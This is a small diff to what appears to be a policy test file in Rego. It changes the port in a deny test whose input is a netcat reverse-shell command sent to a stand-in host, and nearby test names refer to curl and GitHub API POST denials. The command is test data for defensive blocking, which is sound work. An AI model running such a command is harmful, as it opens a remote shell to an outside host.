@@ -31,7 +31,7 @@ test_deny_curl_post if {
 }
 
 test_deny_netcat if {
-	p10_msgs("nc -e /bin/sh h.example 4444") != set()
+	p10_msgs("nc -e /bin/sh h.example 443") != set()
 }
 
 test_deny_gh_api_post if {
